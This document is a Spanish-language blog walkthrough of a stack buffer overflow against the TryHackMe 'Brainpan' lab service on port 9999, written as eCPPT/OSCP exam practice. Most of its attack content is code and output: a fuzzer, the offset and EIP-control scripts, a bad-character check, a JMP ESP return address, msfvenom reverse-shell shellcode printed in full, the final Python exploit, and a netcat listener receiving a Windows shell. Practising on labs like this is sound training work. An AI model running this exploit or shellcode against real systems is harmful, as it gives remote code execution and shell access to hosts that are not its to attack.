---
layout: post
title:  "[eCPPT Style] - Buffer overflow Brainpan.py"
date:   2021-10-16 09:29:20 +0700
categories: jekyll update
---

<figure>
<img src="/assets/img/brainpanthm.png" alt="brainpanthm">
</figure>

Este walkthrough muestra el paso a paso para explotar una vulnerabilidad de tipo stack buffer overflow utilizando un laboratorio de tryhackme (Brainpan) como objetivo. Ejercicio practico de simulacion para el examen de OSCP o eCPTT.

Conectar VPN de Tryhackme `sudo openvpn 5pok.ovpn` y realizar un ping a la maquina vulnerable `ping -c 1 10.10.8.78`

Segun TheCyberMentor, existen 7 pasos para realizar un boffer overflow con exito, estos son:
- A.- Recon ⛏️
- B.- Fuzzing 💥
- C.- Offset 📴
- D.- EIP 📦❓
- E.- Bad Characters 😈
- F.- Module 🔌
- G.- Shellcode 🍳🥚

A.- Recon: Utilizar [Rustscan][rustscan] para empezar la fase de recon.

`rustscan -b 500 -a 10.10.8.78 --ulimit 5000 -- -sC -sV` 

El resultado del scaneo es el siguiente:

{% highlight bash %}
└─$ rustscan -b 500 -a 10.10.8.78 --ulimit 5000 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] Automatically increasing ulimit value to 5000.
Open 10.10.8.78:9999
Open 10.10.8.78:10000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 19:23 -03

PORT      STATE SERVICE REASON  VERSION
9999/tcp  open  abyss?  syn-ack
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN ________________
|_    ENTER THE PASSWORD
10000/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
new-service :
SF-Port9999-TCP:V=7.91%I=7%D=10/18%Time=616DF3E2%P=x86_64-pc-linux
SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20

Nmap done: 1 IP address (1 host up) scanned in 56.98 seconds

{% endhighlight %}  

Se puede visualizar que existen 2 puertos abiertos:

- p:9999 abyss
- p:10000 HTTP

Revisar primero el servicio web HTTP, buscar algun directorio interesante con [ffuf][ffuf] y dentro del directorio "/bin" descargar el .exe vulnerable a bof.

{% highlight bash %}
┌──(spok㉿spok)-[/usr/share/seclists/Discovery/Web-Content]
└─$ ffuf -u http://10.10.8.78:10000//FUZZ -w directory-list-2.3-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.8.78:10000//FUZZ
 :: Wordlist         : FUZZ: directory-list-2.3-medium.txt
________________________________________________

#                       [Status: 200, Size: 215, Words: 7, Lines: 9]
#                       [Status: 200, Size: 215, Words: 7, Lines: 9]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 215, Words: 7, Lines
# on at least 2 different hosts [Status: 200, Size: 215, Words: 7, Lines: 9]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 215, Words: 7, Lines: 9]
bin                     [Status: 301, Size: 0, Words: 1, Lines: 1] <-------------------------------------
[WARN] Caught keyboard interrupt (Ctrl-C)
{% endhighlight %}  

<figure>
<img src="/assets/img/11.png" alt="11">
</figure> 

Ahora probar conexion con telnet al puerto 9999.

{% highlight bash %}
└─$ telnet 10.0.69.5 9999                          
Trying 10.0.69.5...
Connected to 10.0.69.5.
Escape character is '^]'.
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> admin
                          ACCESS DENIED
Connection closed by foreign host.
{% endhighlight %}  

B.- Fuzzing: Mandar fuzzer para ver en donde se produce el bof.

Opcion 1: Fuzzer en python skeleton

{% highlight python %}
#!/usr/bin/python
import sys, socket

direccion = '10.0.69.5'
puerto = 9999
buffer = ['A']
contador = 100

while len(buffer) <= 10:
	buffer.append('A'*contador)
	contador = contador + 100
try:
	for cadena in buffer:
		print '[+] Enviando %s bytes...' % len(cadena)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((direccion, puerto))
        s.recv(1024)
		s.send(cadena + '\r\n')
		s.recv(1024)
		print '[+] Listo'
except:
 	print '[!] No se puede conectar al programa. Puede que lo hayas crasheado.'
 	sys.exit(0)
finally:
	s.close()
{% endhighlight %} 

Opcion 2: Fuzzear manual con 1000 chars

{% highlight bash %}
└─$ nc 10.0.69.5 9999                                                                                        1 ⨯ 1 ⚙
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
{% endhighlight %} 

<figure>
<img src="/assets/img/12.png" alt="12">
</figure> 

<figure>
<img src="/assets/img/13.png" alt="13">
</figure> 

C.- Offset:

Para calcular el offset utilizaremos mona, con este comando podemos definir la carpeta por defecto

`!mona config -set workingfolder c:\mona\%p`

Luego crear un pattern con mona de 1000 caracteres

`!mona pattern_create 1000`

ir a C:mona y abrir txt con pattern, copiar y pegar en nuestro host atacante utilizando nc para abrir una conexion al p:9999

{% highlight bash %}
┌──(spok㉿spok)-[~]
└─$ nc 10.0.69.5 9999                                                                                       
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

>> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
{% endhighlight %} 

Luego en inmmunity debugger calculamos el Offset, basado en el registro EIP 35724134

`!mona findmsp -distance 1000`

<figure>
<img src="/assets/img/monafindmsp.png" alt="monafindmsp">
</figure> 

En este caso es 524 el numero de caracteres necesarios para crashear el programa. Con esta info. podemos comenzar a escribir el codigo

{% highlight python %}
import socket

ip = "10.0.69.5"
port = 9999

prefix = ""
offset = 524 
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("OK...")
    s.send(buffer + "\r\n")    
except:
    print("No fue posible establecer la conexion.")
{% endhighlight %} 

D.- EIP:

Ahora ejecutaremos el codigo para ver si tenemos el control del registro EIP, en este caso deberia aparecer 42424242, este valor seria igual a BBBB en Hex.

{% highlight bash %}
┌──(spok㉿spok)-[~]
└─$ python bof.py 
OK...
{% endhighlight %} 

<figure>
<img src="/assets/img/eip4242.png" alt="eip4242">
</figure>  

E.- Bad Characters:

Para validar los badchars, usaremos mona para crear un bytearray. El parametro -b es para sacar un char, en este caso el 00.

`!mona bytearray -b "\x00"`

<figure>
<img src="/assets/img/monabyte.png" alt="monabyte">
</figure>   

Copiamos los badchars y los pegamos en nuestro payload:

{% highlight python %}
import socket

ip = "10.0.69.5"
port = 9999

prefix = ""
offset = 524 
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("OK...")
    s.send(buffer + "\r\n")    
except:
    print("No fue posible establecer la conexion.")
{% endhighlight %} 


Verificamos que no hay algun x00 con `!mona compare -f C:\mona\brainpan\bytearray.bin -a 005FF920` o hacerlo manual con Follow in dump en ESP y buscar algun 00. Si no funciona !mona compare, probar con `!mona config -set workingfolder c:\mona\%p` o abrir inmunnity en modo administrador.

<figure>
<img src="/assets/img/badchars1.png" alt="badchars1">
</figure>   

Este mensaje significa que no hay badchars en los chars que mandamos:

<figure>
<img src="/assets/img/badchars2.png" alt="badchars2">
</figure>                                                                                                                   

F.- Module:

Ahora hay que buscar un modulo que permita saber la ubicacion del JMP ESP con:

`!mona jmp -r esp -cpb "\x00"`

<figure>
<img src="/assets/img/jmpesp.png" alt="jmpesp">
</figure>   

La direccion de memoria 311712f3 pasarla a formato Little Endian:

\xf3\x12\x17\x31


G.- Shellcode:

Con msfvenom generar el shellcode:

{% highlight bash %}
┌──(spok㉿spok)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.69.4 LPORT=1234 -b '\x00' EXITFUNC=thread -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xda\xd8\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x52\xbd"
payload += b"\x92\x51\x12\xc1\x31\x68\x17\x83\xe8\xfc\x03\xfa"
payload += b"\x42\xf0\x34\x06\x8c\x76\xb6\xf6\x4d\x17\x3e\x13"
payload += b"\x7c\x17\x24\x50\x2f\xa7\x2e\x34\xdc\x4c\x62\xac"
payload += b"\x57\x20\xab\xc3\xd0\x8f\x8d\xea\xe1\xbc\xee\x6d"
payload += b"\x62\xbf\x22\x4d\x5b\x70\x37\x8c\x9c\x6d\xba\xdc"
payload += b"\x75\xf9\x69\xf0\xf2\xb7\xb1\x7b\x48\x59\xb2\x98"
payload += b"\x19\x58\x93\x0f\x11\x03\x33\xae\xf6\x3f\x7a\xa8"
payload += b"\x1b\x05\x34\x43\xef\xf1\xc7\x85\x21\xf9\x64\xe8"
payload += b"\x8d\x08\x74\x2d\x29\xf3\x03\x47\x49\x8e\x13\x9c"
payload += b"\x33\x54\x91\x06\x93\x1f\x01\xe2\x25\xf3\xd4\x61"
payload += b"\x29\xb8\x93\x2d\x2e\x3f\x77\x46\x4a\xb4\x76\x88"
payload += b"\xda\x8e\x5c\x0c\x86\x55\xfc\x15\x62\x3b\x01\x45"
payload += b"\xcd\xe4\xa7\x0e\xe0\xf1\xd5\x4d\x6d\x35\xd4\x6d"
payload += b"\x6d\x51\x6f\x1e\x5f\xfe\xdb\x88\xd3\x77\xc2\x4f"
payload += b"\x13\xa2\xb2\xdf\xea\x4d\xc3\xf6\x28\x19\x93\x60"
payload += b"\x98\x22\x78\x70\x25\xf7\x2f\x20\x89\xa8\x8f\x90"
payload += b"\x69\x19\x78\xfa\x65\x46\x98\x05\xac\xef\x33\xfc"
payload += b"\x27\x1a\xc4\xbb\xb3\x72\xc6\x43\xb8\x50\x4f\xa5"
payload += b"\xaa\x44\x06\x7e\x43\xfc\x03\xf4\xf2\x01\x9e\x71"
payload += b"\x34\x89\x2d\x86\xfb\x7a\x5b\x94\x6c\x8b\x16\xc6"
payload += b"\x3b\x94\x8c\x6e\xa7\x07\x4b\x6e\xae\x3b\xc4\x39"
payload += b"\xe7\x8a\x1d\xaf\x15\xb4\xb7\xcd\xe7\x20\xff\x55"
payload += b"\x3c\x91\xfe\x54\xb1\xad\x24\x46\x0f\x2d\x61\x32"
payload += b"\xdf\x78\x3f\xec\x99\xd2\xf1\x46\x70\x88\x5b\x0e"
payload += b"\x05\xe2\x5b\x48\x0a\x2f\x2a\xb4\xbb\x86\x6b\xcb"
payload += b"\x74\x4f\x7c\xb4\x68\xef\x83\x6f\x29\x0f\x66\xa5"
payload += b"\x44\xb8\x3f\x2c\xe5\xa5\xbf\x9b\x2a\xd0\x43\x29"
payload += b"\xd3\x27\x5b\x58\xd6\x6c\xdb\xb1\xaa\xfd\x8e\xb5"
payload += b"\x19\xfd\x9a"
{% endhighlight %} 

Luego reemplazamos el "retn" y el "payload" en el bof.py, quedando asi:

{% highlight python %}
import socket

ip = "10.0.69.5"
port = 9999

prefix = ""
offset = 524 
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload =  b""
payload += b"\xda\xd8\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x52\xbd"
payload += b"\x92\x51\x12\xc1\x31\x68\x17\x83\xe8\xfc\x03\xfa"
payload += b"\x42\xf0\x34\x06\x8c\x76\xb6\xf6\x4d\x17\x3e\x13"
payload += b"\x7c\x17\x24\x50\x2f\xa7\x2e\x34\xdc\x4c\x62\xac"
payload += b"\x57\x20\xab\xc3\xd0\x8f\x8d\xea\xe1\xbc\xee\x6d"
payload += b"\x62\xbf\x22\x4d\x5b\x70\x37\x8c\x9c\x6d\xba\xdc"
payload += b"\x75\xf9\x69\xf0\xf2\xb7\xb1\x7b\x48\x59\xb2\x98"
payload += b"\x19\x58\x93\x0f\x11\x03\x33\xae\xf6\x3f\x7a\xa8"
payload += b"\x1b\x05\x34\x43\xef\xf1\xc7\x85\x21\xf9\x64\xe8"
payload += b"\x8d\x08\x74\x2d\x29\xf3\x03\x47\x49\x8e\x13\x9c"
payload += b"\x33\x54\x91\x06\x93\x1f\x01\xe2\x25\xf3\xd4\x61"
payload += b"\x29\xb8\x93\x2d\x2e\x3f\x77\x46\x4a\xb4\x76\x88"
payload += b"\xda\x8e\x5c\x0c\x86\x55\xfc\x15\x62\x3b\x01\x45"
payload += b"\xcd\xe4\xa7\x0e\xe0\xf1\xd5\x4d\x6d\x35\xd4\x6d"
payload += b"\x6d\x51\x6f\x1e\x5f\xfe\xdb\x88\xd3\x77\xc2\x4f"
payload += b"\x13\xa2\xb2\xdf\xea\x4d\xc3\xf6\x28\x19\x93\x60"
payload += b"\x98\x22\x78\x70\x25\xf7\x2f\x20\x89\xa8\x8f\x90"
payload += b"\x69\x19\x78\xfa\x65\x46\x98\x05\xac\xef\x33\xfc"
payload += b"\x27\x1a\xc4\xbb\xb3\x72\xc6\x43\xb8\x50\x4f\xa5"
payload += b"\xaa\x44\x06\x7e\x43\xfc\x03\xf4\xf2\x01\x9e\x71"
payload += b"\x34\x89\x2d\x86\xfb\x7a\x5b\x94\x6c\x8b\x16\xc6"
payload += b"\x3b\x94\x8c\x6e\xa7\x07\x4b\x6e\xae\x3b\xc4\x39"
payload += b"\xe7\x8a\x1d\xaf\x15\xb4\xb7\xcd\xe7\x20\xff\x55"
payload += b"\x3c\x91\xfe\x54\xb1\xad\x24\x46\x0f\x2d\x61\x32"
payload += b"\xdf\x78\x3f\xec\x99\xd2\xf1\x46\x70\x88\x5b\x0e"
payload += b"\x05\xe2\x5b\x48\x0a\x2f\x2a\xb4\xbb\x86\x6b\xcb"
payload += b"\x74\x4f\x7c\xb4\x68\xef\x83\x6f\x29\x0f\x66\xa5"
payload += b"\x44\xb8\x3f\x2c\xe5\xa5\xbf\x9b\x2a\xd0\x43\x29"
payload += b"\xd3\x27\x5b\x58\xd6\x6c\xdb\xb1\xaa\xfd\x8e\xb5"
payload += b"\x19\xfd\x9a"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("OK...")
    s.send(buffer + "\r\n")    
except:
    print("No fue posible establecer la conexion.")
{% endhighlight %} 

Finalmente, abrir el puerto 1234 con netcat para ganar acceso con una reverse shell.

{% highlight bash %}
┌──(spok㉿spok)-[~]
└─$ nc -nlvp 1234    
listening on [any] 1234 ...
connect to [10.0.69.4] from (UNKNOWN) [10.0.69.5] 49233
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Users\spokbof\Desktop>
{% endhighlight %} 

Pwned!

Luego de aprender el proceso manual, se puede analizar el script [BOF-SemiAutomatic][BOF-SemiAutomatic] para automatizar el proceso.


[rustscan]: https://github.com/RustScan/RustScan
[ffuf]: https://github.com/ffuf/ffuf
[pry]: https://zoomadmin.com/HowToInstall/UbuntuPackage/pry
[badchars]: https://github.com/dievus/bufferoverflow/blob/master/badchars
[BOF-SemiAutomatic]: https://github.com/evets007/BOF-SemiAutomatic
